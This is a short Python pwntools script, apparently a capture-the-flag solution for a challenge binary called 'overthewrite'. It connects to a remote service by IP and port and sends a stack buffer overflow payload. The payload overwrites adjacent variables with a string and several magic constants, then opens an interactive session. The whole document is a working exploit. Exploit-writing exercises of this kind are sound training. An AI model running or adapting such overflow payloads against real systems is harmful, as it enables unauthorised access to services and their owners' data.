from pwn import *

exe = context.binary = ELF('./overthewrite', checksec=False)

# r = exe.process()
# gdb.attach(r)

r = remote('159.89.197.210', 9992)

payload = b'a'*(4*11-12) + b'Welcome to KCSC'  + b'\x00'*9 + p64(0x215241104735F10F) + p64(0xDEADBEEFCAFEBABE) + b'aaaa' + p64(322376503)

r.sendlineafter(b'Key: ', payload)

r.interactive()